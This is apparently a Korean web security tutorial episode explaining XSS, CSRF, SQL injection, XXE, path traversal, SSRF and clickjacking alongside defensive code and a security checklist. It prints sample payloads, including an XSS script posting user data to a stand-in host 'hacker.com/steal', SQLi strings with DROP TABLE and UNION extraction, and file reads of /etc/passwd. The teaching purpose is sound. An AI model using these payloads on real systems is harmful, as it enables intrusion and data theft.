# Episode 8-5: 웹 보안, XSS와 CSRF 그리고 해커의 공격법

## 🎬 Scene: 해킹당한 관리자 페이지

```
월요일 아침, 긴급 회의

보안팀: "어제 밤 관리자 계정이 해킹당했습니다"
CEO: "비밀번호가 유출됐나요?"
보안팀: "아니요. XSS 공격이었습니다"

[공격 재현]
해커의 댓글:
"좋은 글이네요! <script>steal()</script>"

일반 사용자가 보는 것: "좋은 글이네요!"
브라우저가 실행하는 것: steal() 함수

결과:
- 관리자 세션 탈취
- 1만 명 개인정보 유출
- 서비스 3일 중단

디자이너: "디자인만 했는데 제 잘못도 있나요?"
보안팀: "입력 폼 만드신 분이..."

손실: 50억 (복구 + 보상 + 신뢰도)
```

**모든 사용자 입력은 잠재적 공격입니다.**

## Part 1: XSS (Cross-Site Scripting)

### 😈 XSS 공격 유형

```
1. Reflected XSS (반사형)
URL 파라미터 → 즉시 실행

공격 URL:
site.com/search?q=<script>alert('XSS')</script>

서버 응답:
"검색 결과: <script>alert('XSS')</script>"
→ 스크립트 실행!

2. Stored XSS (저장형) - 가장 위험
DB 저장 → 모든 사용자 영향

해커의 게시글:
제목: "안녕하세요"
내용: <script>
  fetch('/api/users')
    .then(r => r.json())
    .then(data => {
      fetch('http://hacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      })
    })
</script>

3. DOM XSS (DOM 기반)
클라이언트 사이드 실행

취약한 코드:
document.getElementById('welcome').innerHTML = 
  '환영합니다, ' + location.hash.substring(1);

공격:
site.com#<img src=x onerror=alert('XSS')>
```

### 🛡 XSS 방어 기법

```javascript
// 1. 입력 검증 (Validation)
function validateInput(input) {
  // 화이트리스트 방식
  const allowedChars = /^[a-zA-Z0-9가-힣\s]+$/;
  if (!allowedChars.test(input)) {
    throw new Error('Invalid characters');
  }
  return input;
}

// 2. 출력 인코딩 (Encoding)
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// 3. CSP (Content Security Policy)
// HTTP Header
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-randomValue';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;

// 4. 안전한 DOM 조작
// 위험한 방법
element.innerHTML = userInput;  // ❌
document.write(userInput);      // ❌
eval(userInput);                 // ❌

// 안전한 방법
element.textContent = userInput;  // ✅
element.setAttribute('value', userInput);  // ✅

// 5. 라이브러리 사용
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirty);
element.innerHTML = clean;  // 안전!
```

## Part 2: CSRF (Cross-Site Request Forgery)

### 🎭 CSRF 공격 원리

```
CSRF = 사용자 모르게 요청 위조

시나리오:
1. 사용자가 은행 사이트 로그인
2. 해커 사이트 방문
3. 숨겨진 요청 실행
4. 은행 계좌에서 송금 완료!

해커의 함정 페이지:
<h1>축하합니다! 경품 당첨!</h1>

<!-- 숨겨진 폼 -->
<form id="evil" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="1000000">
</form>

<script>
  document.getElementById('evil').submit();
</script>

왜 가능한가?
- 브라우저는 자동으로 쿠키 전송
- 은행은 정상 요청으로 인식
- 사용자는 모름
```

### 🔐 CSRF 방어

```javascript
// 1. CSRF 토큰
// 서버: 토큰 생성
app.use(csrf());

app.get('/form', (req, res) => {
  res.render('form', {
    csrfToken: req.csrfToken()
  });
});

// 클라이언트: 토큰 포함
<form method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <input type="text" name="amount">
  <button>송금</button>
</form>

// 2. SameSite 쿠키
Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly

SameSite 옵션:
- Strict: 크로스 사이트 요청 시 쿠키 전송 안함
- Lax: GET은 허용, POST는 차단
- None: 항상 전송 (HTTPS 필수)

// 3. Referer 검증
app.post('/transfer', (req, res) => {
  const referer = req.get('Referer');
  if (!referer || !referer.startsWith('https://mybank.com')) {
    return res.status(403).send('Invalid referer');
  }
  // 처리...
});

// 4. Double Submit Cookie
// 쿠키와 헤더/바디 둘 다 토큰 전송
const token = getCookie('csrf-token');
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token
  },
  body: JSON.stringify(data)
});

// 5. 사용자 인터랙션 요구
// 중요 작업 시 재인증
<form method="POST">
  <p>정말 100만원을 송금하시겠습니까?</p>
  <input type="password" placeholder="비밀번호 재입력">
  <button>확인</button>
</form>
```

## Part 3: SQL Injection

### 💉 SQL Injection 공격

```
취약한 코드:
const query = `
  SELECT * FROM users 
  WHERE email = '${email}' 
  AND password = '${password}'
`;

공격:
email: admin@example.com
password: ' OR '1'='1

실제 실행 쿼리:
SELECT * FROM users 
WHERE email = 'admin@example.com' 
AND password = '' OR '1'='1'
→ 항상 참! 로그인 성공!

고급 공격:
'; DROP TABLE users; --
'; UPDATE users SET role='admin' WHERE email='hacker@evil.com'; --

정보 추출:
' UNION SELECT username, password FROM users --
' AND 1=0 UNION SELECT table_name, null FROM information_schema.tables --
```

### 🛡 SQL Injection 방어

```javascript
// 1. Prepared Statements (가장 안전)
// ✅ Good
const query = 'SELECT * FROM users WHERE email = ? AND password = ?';
db.query(query, [email, password], (err, results) => {
  // 안전!
});

// ❌ Bad
const query = `SELECT * FROM users WHERE email = '${email}'`;

// 2. 입력 검증
function validateEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    throw new Error('Invalid email');
  }
  return email;
}

// 3. 최소 권한 원칙
-- 읽기 전용 계정
CREATE USER 'app_reader'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON mydb.* TO 'app_reader'@'localhost';

-- 쓰기 계정 (DROP, ALTER 권한 없음)
CREATE USER 'app_writer'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'app_writer'@'localhost';

// 4. ORM 사용
// Sequelize
const user = await User.findOne({
  where: {
    email: email,
    password: password
  }
});

// TypeORM
const user = await userRepository.findOne({
  where: { email, password }
});

// 5. 에러 메시지 숨기기
// ❌ Bad
catch (err) {
  res.status(500).json({ error: err.message });
  // "Unknown column 'admin' in 'where clause'"
}

// ✅ Good
catch (err) {
  console.error(err);  // 서버 로그에만
  res.status(500).json({ error: 'Internal server error' });
}
```

## Part 4: 기타 웹 공격

### 🔨 다양한 공격 벡터

```
1. XXE (XML External Entity)
취약한 XML 파싱:
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

방어:
parser.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

2. Path Traversal
공격:
/download?file=../../../../etc/passwd

방어:
const safePath = path.join(UPLOAD_DIR, path.basename(filename));

3. SSRF (Server-Side Request Forgery)
공격:
/fetch?url=http://169.254.169.254/latest/meta-data/

방어:
- URL 화이트리스트
- 내부 IP 차단

4. Clickjacking
공격:
<iframe src="https://bank.com/transfer" style="opacity:0">
<button style="position:absolute">Click for Prize!</button>

방어:
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

5. File Upload 취약점
공격:
shell.php.jpg (더블 확장자)
shell.php%00.jpg (NULL 바이트)

방어:
- 확장자 화이트리스트
- 파일 타입 검증
- 별도 스토리지 저장
- 실행 권한 제거
```

## Part 5: 보안 실무

### 🔍 보안 테스트

```bash
# 보안 스캐너 도구

# 1. OWASP ZAP (무료)
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://example.com

# 2. Burp Suite
# 프록시로 트래픽 가로채기
# 자동/수동 취약점 테스트

# 3. npm audit (Node.js)
npm audit
npm audit fix

# 4. Snyk
snyk test
snyk monitor

# 5. SQLMap (SQL Injection)
sqlmap -u "http://example.com/page?id=1" --batch

# 보안 헤더 체크
curl -I https://example.com | grep -E "X-Frame-Options|X-Content-Type|CSP"
```

### 📋 보안 체크리스트

```
개발 단계:
□ 입력 검증 (서버 사이드)
□ 출력 인코딩
□ Prepared Statements
□ HTTPS 전용
□ 보안 헤더 설정
□ CSRF 토큰
□ 세션 관리
□ 에러 처리
□ 로깅 & 모니터링

디자인 단계:
□ 비밀번호 마스킹
□ 민감정보 숨김
□ 피싱 방지 UI
□ 명확한 보안 표시
□ 2단계 확인 UX

배포 전:
□ 보안 스캔
□ 펜테스트
□ 코드 리뷰
□ 의존성 검사
□ 설정 확인

운영 중:
□ 보안 패치
□ 로그 모니터링
□ 이상 탐지
□ 백업
□ 인시던트 대응
```

## 🎁 Bonus: Bug Bounty

### 🎯 버그 바운티 프로그램

```
화이트해커가 되는 법:

1. 플랫폼 가입
- HackerOne
- Bugcrowd
- Synack

2. 보상 규모
XSS: $500-5,000
SQLi: $1,000-10,000
RCE: $5,000-50,000
Account Takeover: $2,000-20,000

3. 책임감 있는 공개
- 회사에 먼저 보고
- 패치 시간 제공
- PoC 제공
- 공개 조율

4. 실력 키우기
- OWASP Top 10 학습
- CTF 참가
- 버그 바운티 write-up 읽기
- 실습 환경 구축

윤리적 해킹 규칙:
✅ 허가받은 범위만
✅ 데이터 유출 금지
✅ 서비스 방해 금지
✅ 즉시 보고
❌ 불법 행위
```

## 💡 핵심 메시지

> "보안은 가장 약한 고리만큼 강합니다.
> 한 줄의 취약한 코드가
> 전체 시스템을 무너뜨릴 수 있습니다.
> 
> 모든 입력을 의심하고,
> 모든 출력을 검증하세요.
> 
> 보안은 개발자만의 책임이 아닙니다.
> 디자이너, PM, 모두의 책임입니다."

**기억하세요:**
- Never Trust User Input
- Defense in Depth
- Least Privilege
- Fail Securely

## 🚀 다음 에피소드 예고

**"Episode 8-6: 클라우드 보안"**

클라우드 시대의 보안:
- IAM과 권한 관리
- 데이터 암호화
- 컴플라이언스
- 제로 트러스트

"남의 컴퓨터를 안전하게 쓰는 법"

---

*"The only truly secure system is one that is powered off,
cast in a block of concrete and sealed in a lead-lined room
with armed guards." - Gene Spafford*

**#웹보안 #XSS #CSRF #SQLInjection #OWASP**